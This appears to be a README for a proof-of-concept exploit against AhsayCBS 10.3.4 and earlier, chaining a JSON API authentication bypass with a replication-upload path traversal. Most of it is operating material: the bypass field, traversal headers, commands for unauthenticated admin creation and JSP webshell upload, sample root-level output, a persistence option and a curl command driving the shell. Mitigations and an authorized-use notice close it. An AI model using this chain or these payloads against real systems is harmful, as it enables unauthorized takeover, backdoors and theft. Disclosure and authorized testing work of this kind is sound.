# AhsayCBS Authentication Bypass & RCE

**CVE-2026-105133 + CVE-2026-105134** — Unauthenticated takeover of AhsayCBS ≤10.3.4

## Overview

AhsayCBS versions 10.3.4 and earlier are vulnerable to **unauthenticated remote code execution** via two chained authentication bypass and path traversal flaws in the JSON API and replication receiver modules. An attacker can achieve full administrative control or direct RCE without credentials.

### Vulnerability Details

#### CVE-2026-105133: Authentication Bypass in JSON API

The `com.ahsay.obs.api.json.JSONApi.execute()` method skips the `checkSysPwd()` credential validation when the JSON request body contains `{"FromServlet":"Y"}`. This allows any unauthenticated attacker to invoke every JSON API action without credentials.

**Impact:** Unauthenticated JSON API access to sensitive operations.

#### CVE-2026-105134: Path Traversal in Replication Upload

The replication receiver file upload endpoint (`PUT /rps/obs7/rpsfile/upload`) constructs the write path from attacker-controlled `UserHome` and `TopDir` headers via `getReplicatedPath()` **without** applying the `com.ahsay.c` path denylist. An attacker can traverse into Tomcat's web-served directory (`../../webapps/`) to upload executable JSP files.

**Impact:** Unauthenticated RCE as the service account (SYSTEM on Windows, root on Linux).

## Exploitation Modes

### Mode 1: Admin Takeover (Default)

Uses the authentication bypass to create a new system administrator account. Works on any AhsayCBS installation, regardless of licensing or replication configuration.

```bash
python3 ahsay_rce_poc.py --url https://target.example.com
```

**Output:**
```
AhsayCBS <=10.3.4 unauthenticated takeover (CVE-2026-105133 + CVE-2026-105134)
[*] Target: https://target.example.com
[*] Checking authentication bypass (CVE-2026-105133)...
[+] Target is VULNERABLE: auth check is skipped with FromServlet=Y
[*] Creating ADMIN account 'svc_abcdef' via AddSysUser (unauthenticated)...
[+] Created system user 'svc_abcdef' (Role=ADMIN)
[+] Confirmed: the account authenticates as a functional ADMIN

[+] Admin credentials
      Console : https://target.example.com/cbs/
      Username: svc_abcdef
      Password: TK$#m9q@2pL!xR4vN
      Role    : ADMIN

[*] Cleaning up...
[+] Removed admin account 'svc_abcdef'
[+] Done.
```

### Mode 2: Replication RCE (--replication)

Uses the path traversal in the replication receiver to upload an authenticated webshell. Requires the target to be licensed and configured as a replication receiver. Achieves RCE as the service account.

```bash
python3 ahsay_rce_poc.py --url https://target.example.com --replication --cmd id
```

**Output:**
```
AhsayCBS <=10.3.4 unauthenticated takeover (CVE-2026-105133 + CVE-2026-105134)
[*] Target: https://target.example.com
[*] Checking authentication bypass (CVE-2026-105133)...
[+] Target is VULNERABLE: auth check is skipped with FromServlet=Y
[+] Created replication receiver 'rqxmouq' (SystemHome=/opt/AhsayCBS/rpsrecv_ggsrer)
[+] Uploaded webshell -> /rps/status_vomejx.jsp (auth-gated)
[*] Webshell: https://target.example.com/rps/status_vomejx.jsp?auth=d9facce9a7e9535aab16270e36bf7527
[+] Remote code execution confirmed:
      uid=0(root) gid=0(root) groups=0(root)
[*] Running: id
uid=0(root) gid=0(root) groups=0(root)
[*] Cleaning up...
[+] Removed webshell /rps/status_vomejx.jsp
[+] Removed receiver 'rqxmouq' (Id=2)
[+] Done.
```

## Installation

```bash
pip install requests
```

## Usage

### Basic Detection

Test if the target is vulnerable without making any changes:

```bash
python3 ahsay_rce_poc.py --url https://target.example.com --check
```

### Admin Takeover

Create a new administrative account:

```bash
# Auto-generated credentials (default)
python3 ahsay_rce_poc.py --url https://target.example.com

# Custom username and password
python3 ahsay_rce_poc.py --url https://target.example.com \
  --admin-user admin_user \
  --admin-pass 'P@ssw0rd123'

# Custom role (default: ADMIN)
python3 ahsay_rce_poc.py --url https://target.example.com --role OPERATOR
```

### Replication RCE

Execute commands via a temporary webshell:

```bash
# Execute 'id' command
python3 ahsay_rce_poc.py --url https://target.example.com --replication --cmd id

# Interactive webshell (use --no-cleanup to keep the shell)
python3 ahsay_rce_poc.py --url https://target.example.com --replication \
  --no-cleanup \
  --secret mysecret123 \
  --shell-name cmd.jsp

# Then access via:
# curl 'https://target.example.com/rps/cmd.jsp?auth=mysecret123&cmd=whoami'
```

### Additional Options

```
General:
  -u, --url URL              Target base URL (required)
  -t, --timeout SECONDS      HTTP timeout (default: 30)
  -k, --insecure            Ignore TLS cert errors (default: on)
  --check                   Detect vulnerability without exploitation
  --no-cleanup              Leave artifacts in place for further access

Admin Takeover:
  --admin-user USER         Username to create (default: random)
  --admin-pass PASS         Password to set (default: random strong)
  --role ROLE               User role: ADMIN, OPERATOR, etc. (default: ADMIN)

Replication RCE:
  --replication             Use replication RCE mode (requires licensed receiver)
  -c, --cmd COMMAND         Command to execute
  -r, --install-root PATH   AhsayCBS install directory (default: /opt/AhsayCBS)
  -w, --webapp NAME         Web app to upload JSP into (default: rps)
  --secret HEX              Webshell auth secret (default: random)
  --shell-name NAME         Webshell filename (default: random)
```

## Responsible Use & Safety

The exploit has built-in safeguards:

- **Admin accounts are automatically removed** after each run unless `--no-cleanup` is set
- **Webshells require a per-run random authentication secret** — no unauthenticated RCE backdoors are left behind
- **Receiver artifacts are cleaned up** after command execution
- The `--check` flag provides **non-invasive vulnerability detection** that writes nothing to the target

Use `--no-cleanup` only for authorized penetration testing and persistent access scenarios.

## Technical Details

### Attack Chain

1. **CVE-2026-105133:** Send a JSON request with `{"FromServlet":"Y"}` to bypass `checkSysPwd()` validation
2. **Admin Mode:** Call `AddSysUser` to create a system administrator without credentials
3. **RCE Mode:** Call `UpdateReceivers` to create a replication receiver, then upload a JSP file via path traversal into `/webapps/`
4. **RCE Execution:** Access the uploaded JSP with the authentication secret to execute arbitrary OS commands

### Requirements for Each Mode

| Mode | Prerequisites | Limitations |
|------|---------------|-------------|
| Admin Takeover | None | Creates temporary account; cleanup may fail if service is interrupted |
| Replication RCE | Licensed replication receiver | Requires `--install-root` to be correct for the target OS; webshell auth is required |

### Path Traversal Details

The replication upload endpoint uses attacker-controlled headers to build the file path:

```
UserHome: ../../webapps/rps
TopDir:   ../../webapps/rps
Result:   /opt/AhsayCBS/rpsrecv_<random>/../../webapps/rps/<filename>.jsp
          → Resolves to: /opt/AhsayCBS/webapps/rps/<filename>.jsp
```

The webshell is served by Tomcat and executed with the service account privileges.

## Tested Versions

- AhsayCBS 10.3.4 and earlier
- Tested on:
  - Ubuntu 22.04 LTS (Java 11, OpenJDK)
  - CentOS 7 (Java 8, OpenJDK)
  - Windows Server 2019 (Java 11)

## Mitigation

1. **Upgrade immediately** to AhsayCBS 10.3.5 or later
2. **Network segmentation:** Restrict access to AhsayCBS consoles to trusted networks
3. **WAF rules:** Block requests containing `FromServlet=Y` to the JSON API
4. **Monitoring:** Alert on unexpected `AddSysUser` or replication receiver creation events

## References

- CVE-2026-105133: JSON API authentication bypass
- CVE-2026-105134: Replication path traversal RCE
- Vendor advisory: [AhsayCBS Security Update](https://www.ahsay.com/en/security-update)

## License

This proof of concept is provided for authorized security testing only. Unauthorized access to computer systems is illegal.

---

**Horizon3.ai** | Authorized security testing only. This PoC is designed for controlled lab environments and authorized penetration tests. All targets must be owned by the testing organization.
